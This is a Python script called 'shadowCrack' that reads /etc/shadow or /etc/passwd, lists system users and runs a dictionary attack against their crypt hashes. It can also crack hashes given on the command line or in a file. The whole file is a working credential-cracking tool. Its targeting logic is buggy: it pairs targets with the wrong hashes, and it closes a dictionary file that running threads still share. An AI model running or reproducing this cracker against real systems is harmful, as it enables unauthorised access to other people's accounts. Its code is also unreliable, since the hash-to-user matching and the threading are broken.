#!/usr/bin/env python
# To-Do:
#   1) Add brute-force option
#   2) Add changing text to display guess count
#
############################################################
import sys
import crypt
from threading import Thread


__author__ = "Aristos"
__title__ = "shadowCrack"
__version__ = 1.0


def helpPage(status):
	print(("Usage: %s [options]" % __title__))
	print("\nOptions:")
	print("\t-t <target(s)>   specify a comma separated list of users to target")
	print("\t-c <hash>        specify a hash to crack (deliminate any invalid characters)")
	print("\t-f <filename>    specify a text file to read hashes from")
	print("\t-d <filename>    specify a dictionary file")
	print("\t-b, --brute      use brute-forcing to crack hashes (Not Implemented)")
	print("\t-h, --help       display this help page and exit")
	print("\t-l, --list       list all users on the system and exit")
	print("\nDescription:")
	print(("\t%s is a password cracker for *nix systems," % __title__))
	print("\tit will either find hashed passwords or get them as user")
	print("\tinput and then try to crack them using a dictionary attack.")
	sys.exit(status)


def errHandle(error, fname):
	if ("Errno 13" in str(error)):
		print(("[!] Error Permission Denied: Can\'t Open '%s'" % fname))
	elif ("Errno 2" in str(error)):
		print(("[!] Error File not Found: Can\'t Find '%s'" % fname))
	else:
		print(("[!] Unknown Error while Opening File '%s'" % fname))
	print("[*] Aborting...")


def crackHash(cryptPass, user, dictFile):
	dictFile.seek(0, 0)
	
	try:
		salt = "$" + cryptPass.split('$')[1] + "$" + cryptPass.split('$')[2]
	except:
		print("[!] Invalid Hash. (make sure to add '\\' before any '$' characters)")
		print("[*] Aborting...")
		dictFile.close()
		sys.exit(1)
	
	for word in dictFile.readlines():
		word = word.strip('\n')
		cryptWord = crypt.crypt(word, salt)
		if (cryptWord == cryptPass):
			if (not user):
				print(("[+] Hash Cracked: '%s'" % cryptPass))
				print(("[+]     Password: '%s'\n" % word))
			else:
				print(("[+] Password for '%s' Found: '%s'" % (user, word)))
			return
	
	if (not user):
		print("[-] Unable to Crack User Provided Hash.")
	else:
		print(("[-] Password for '%s' Not Found!" % user))
	return


def getUsers(filename):
	try:
		passFile = open(filename, 'r')
	except Exception as err:
		errHandle(err, filename)
		sys.exit(1)

	users = []
	hashPass = []
	for line in passFile.readlines():
		cryptPass = line.split(':')[1].strip('\n')
		if (len(cryptPass) > 6):
			users.append(line.split(':')[0])
			hashPass.append(line.split(':')[1].strip('\n'))
	passFile.close()
	return users, hashPass


def checkArgs():
	listTargs = False
	targets = []
	userHash = ""
	dictionary = ""
	userFile = ""
	
	i = 1
	while (i < len(sys.argv)):
		if (sys.argv[i] == "-h") | (sys.argv[i] == "--help"):
			helpPage(0)
			break
		elif (sys.argv[i] == "-l") | (sys.argv[i] == "--list"):
			listTargs = True
			break
		elif (sys.argv[i] == "-d"):
			i += 1
			if (i == len(sys.argv)):
				print("[!] Error No Value Specified for Option '-d'.\n")
				helpPage(1)
			dictionary = sys.argv[i]
		elif (sys.argv[i] == "-t"):
			i += 1
			if (i == len(sys.argv)):
				print("[!] Error No Value Specified for Option '-t'.\n")
				helpPage(1)
			
			try:
				targets = (sys.argv[i]).split(',')
			except:
				print(("[!] Error Invalid Value '%s' for option '%s'.\n" % (sys.argv[i], sys.argv[i-1])))
				helpPage(1)
		elif (sys.argv[i] == "-c"):
			i += 1
			if (i == len(sys.argv)):
				print("[!] Error No Value Specified for Option '-c'.\n")
				helpPage(1)
			userHash = sys.argv[i]
		elif (sys.argv[i] == "-f"):
			i += 1
			if (i == len(sys.argv)):
				print("[!] Error No Value Specified for Option '-f'.\n")
				helpPage(1)
			userFile = sys.argv[i]
		else:
			print(("[!] Error Invalid Argument '%s'.\n" % sys.argv[i]))
			helpPage(1)
		i += 1
	return listTargs, targets, userHash, dictionary, userFile


def main():
	PASS_FILES = ['/etc/shadow', '/etc/passwd']
	
	if (not sys.argv[1:]):
		helpPage(0)

	listTargs, targets, userHash, dictionary, userFile = checkArgs()

	if (listTargs):
		print("[*] Searching for Users...")
		for file in PASS_FILES:
			targets, hashPass = getUsers(file)
			if (targets):
				break;
		print(("[+] %d User(s) Found." % len(targets)))
		print(("[+] %s" % ", ".join(map(str, targets))))
		sys.exit(0)
	elif (not dictionary):
		print("[-] No dictionary File Specified.")
		print("[*] Aborting...")
		sys.exit(0)
	elif (not userHash and not userFile and not targets):
		print("[-] No Targets or Hashes Specified.")
		print("[*] Aborting...")
		sys.exit(0)
	
	try:
		dictFile = open(dictionary, 'r')
	except Exception as err:
		errHandle(err, dictionary)
		sys.exit(1)
	
	if (userHash):
		print("[*] Cracking Specified Hash...\n")
		crackHash(userHash, None, dictFile)

	if (userFile):
		print("[*] Reading Hashes From Specified File...\n")
		try:
			hashFile = open(userFile, 'r')
		except Exception as err:
			errHandle(err, userFile)
		
		for line in hashFile.readlines():
			hashPass = line.strip('\n')
			t = Thread(target=crackHash, args=(hashPass, None, dictFile))
			t.start()
		hashFile.close()

	if (targets):
		for file in PASS_FILES:
			print("[*] Searching for Users...")
			users, hashPass = getUsers(file)
		
			notFound = []
			for target in targets:
				for user in users:
					if (user == target):
						print(("[+] User '%s' Found" % str(target)))
						break
				else:
					print(("[-] User '%s' Not Found" % str(target)))
					notFound.append(target)
			
			for target in notFound:
				targets.remove(target)
			
			if (targets):
				break;
			
		if (not targets):
			print("\n[-] No Targets Found")
			print("[*] Aborting...")
			dictFile.close()
			sys.exit(0)
		
		print ("\n[*] Attacking Specified User(s)...")
		
		for (i, target) in enumerate(targets):
			print(("[*] Cracking Password for '%s'" % target))
			if (len(targets) == 1):
				crackHash(hashPass[0], target, dictFile)
			else:
				t = Thread(target=crackHash, args=(hashPass[i], target, dictFile))
				t.start()
	dictFile.close()

if (__name__ == "__main__"):
	print(("[***] %s v%.1f Wtiten By %s [***]\n"
	% (__title__, __version__, __author__)))
	main()
